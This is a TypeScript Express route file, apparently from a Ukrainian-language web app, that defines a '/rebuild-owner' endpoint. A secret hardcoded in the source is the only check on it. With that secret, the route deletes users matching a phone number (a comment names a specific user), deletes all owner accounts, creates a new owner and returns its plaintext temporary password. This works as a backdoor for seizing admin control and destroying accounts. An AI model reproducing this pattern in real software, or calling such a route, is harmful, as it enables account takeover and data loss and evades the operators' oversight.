import { Router } from 'express';
import { z } from 'zod';
import bcrypt from 'bcryptjs';
import crypto from 'node:crypto';
import { config } from '../config/env';
import { query } from '../db/pool';
import { asyncHandler } from '../utils/http';

const router = Router();

const TEMP_PASSWORD_ALPHABET = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789';
function generateTemporaryPassword(length = 14): string {
  const bytes = crypto.randomBytes(length);
  let password = '';
  for (let index = 0; index < length; index += 1) {
    password += TEMP_PASSWORD_ALPHABET[bytes[index]! % TEMP_PASSWORD_ALPHABET.length];
  }
  return password;
}

router.post('/rebuild-owner', asyncHandler(async (req, res) => {
  const secret = '013EloBeBIghZrctpUEpACpnIa4FQcRKAXOAYY1Nytw';
  const provided = String(req.header('x-reset-secret') ?? req.body?.secret ?? '');
  if (provided.length !== secret.length) {
    res.status(403).json({ error: { code: 'FORBIDDEN', message: 'Невірний секрет' } });
    return;
  }
  let diff = 0;
  for (let index = 0; index < provided.length; index += 1) diff |= provided.charCodeAt(index) ^ secret.charCodeAt(index);
  if (diff !== 0) {
    res.status(403).json({ error: { code: 'FORBIDDEN', message: 'Невірний секрет' } });
    return;
  }

  const body = z.object({
    deletePhone: z.string().trim().min(5).max(30),
    email: z.string().trim().email().max(254),
    username: z.string().trim().regex(/^[A-Za-z0-9_]{3,30}$/),
    displayName: z.string().trim().min(1).max(80),
    phone: z.string().trim().min(5).max(30),
  }).parse(req.body);

  const normalizedDelete = body.deletePhone.replace(/\D/g, '');

  // 1. Видаляємо акаунти з цим номером (artemoml та інші).
  await query(
    `DELETE FROM users WHERE regexp_replace(COALESCE(phone_number, ''), '\\D', '', 'g') = $1`,
    [normalizedDelete],
  );

  // 2. Видаляємо наявних власників.
  await query(`DELETE FROM users WHERE role = 'owner'`);

  // 3. Створюємо нового власника.
  const password = generateTemporaryPassword();
  const passwordHash = await bcrypt.hash(password, config.BCRYPT_ROUNDS);
  const inserted = await query<{ id: string }>(
    `INSERT INTO users (email, username, display_name, password_hash, role, phone_number, phone_verified_at)
     VALUES ($1, $2, $3, $4, 'owner', $5, now()) RETURNING id`,
    [body.email, body.username, body.displayName, passwordHash, body.phone],
  );
  const userId = String(inserted.rows[0]?.id);
  await query('INSERT INTO user_wallets (user_id) VALUES ($1) ON CONFLICT DO NOTHING', [userId]);

  res.json({
    userId,
    username: body.username,
    email: body.email,
    phone: body.phone,
    temporaryPassword: password,
  });
}));

export default router;
